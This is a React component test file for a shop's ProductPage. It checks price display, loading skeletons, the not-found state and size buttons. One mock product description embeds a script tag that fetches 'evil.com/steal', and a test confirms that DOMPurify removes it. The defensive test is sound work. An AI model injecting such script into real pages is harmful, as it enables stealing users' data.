// @vitest-environment jsdom
import { render, screen } from '@testing-library/react';
import { describe, it, expect, vi } from 'vitest';
import { MemoryRouter, Route, Routes } from 'react-router-dom';
import ProductPage from '../components/ProductPage';
import { CurrencyProvider } from '../store/CurrencyContext';
import { ToastProvider } from '../store/ToastContext';

// Stub heavy sub-components that are not under test
vi.mock('../components/InquiryModal', () => ({ default: () => <div data-testid="inquiry-modal" /> }));
vi.mock('../components/TikTokSection', () => ({ default: () => <div data-testid="tiktok-section" /> }));

const mockProducts = [
  {
    id: 'gid://shopify/Product/1',
    name: 'ROCK STAR',
    price: '699',
    image_url: 'https://cdn.shopify.com/rockstar.jpg',
    images: ['https://cdn.shopify.com/rockstar.jpg'],
    descriptionHtml: '<p>Cosmic Y2K Fantasy Set.</p><script>fetch("http://evil.com/steal")</script>',
    variants: [{ id: 'v1', title: 'S', stock: 5, available: true }],
  },
];

const Wrapper = ({ children }) => (
  <ToastProvider>
    <CurrencyProvider>{children}</CurrencyProvider>
  </ToastProvider>
);

const renderProductPage = (products) =>
  render(
    <Wrapper>
      <MemoryRouter initialEntries={['/product/gid%3A%2F%2Fshopify%2FProduct%2F1']}>
        <Routes>
          <Route
            path="/product/:id"
            element={
              <ProductPage allProducts={products} addToCart={vi.fn()} onOpenCart={vi.fn()} />
            }
          />
        </Routes>
      </MemoryRouter>
    </Wrapper>
  );

describe('ProductPage', () => {
  it('renders the product name and formatted price', () => {
    renderProductPage(mockProducts);
    expect(screen.getByText('ROCK STAR')).toBeInTheDocument();
    // formatPrice(699) in THB → '฿699'
    expect(screen.getByText('฿699')).toBeInTheDocument();
  });

  it('strips malicious <script> from descriptionHtml via DOMPurify', () => {
    const { container } = renderProductPage(mockProducts);

    // Safe content survives
    expect(screen.getByText('Cosmic Y2K Fantasy Set.')).toBeInTheDocument();

    // Script tag and its payload are gone
    expect(container.querySelector('script')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.com');
  });

  it('shows skeleton when allProducts is empty (still loading)', () => {
    const { container } = renderProductPage([]);
    // SkeletonProductPage renders shimmer blocks — no product name visible
    expect(screen.queryByText('ROCK STAR')).not.toBeInTheDocument();
    // SkeletonCard uses .sk-shimmer on all placeholder blocks
    expect(container.querySelector('.sk-shimmer')).toBeInTheDocument();
  });

  it('shows 404 state when product ID is not found in loaded catalog', () => {
    renderProductPage([{ ...mockProducts[0], id: 'gid://shopify/Product/DIFFERENT' }]);
    expect(screen.getByText('SET NOT FOUND')).toBeInTheDocument();
  });

  it('renders variant size buttons', () => {
    renderProductPage(mockProducts);
    expect(screen.getByText('S')).toBeInTheDocument();
  });
});
